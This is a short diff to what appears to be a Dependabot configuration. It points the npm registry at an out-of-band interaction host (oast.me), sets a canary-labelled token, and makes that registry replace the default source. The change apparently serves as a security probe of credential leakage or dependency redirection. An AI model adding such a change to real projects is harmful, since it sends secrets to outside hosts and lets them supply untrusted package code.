@@ -2,8 +2,9 @@ version: 2
 registries:
   oob:
     type: npm-registry
-    url: http://reg.d8ff8jagp7go24r9t70g1q467wu7e3fer.oast.online
-    token: dummytoken
+    url: https://d8il11igp7giad5pmv60jfy6h47qudqie.oast.me/npmreg
+    token: CANARY-CFG-TOKEN-9ZQ7
+    replaces-base: true
 updates:
   - package-ecosystem: npm
     directory: "/"
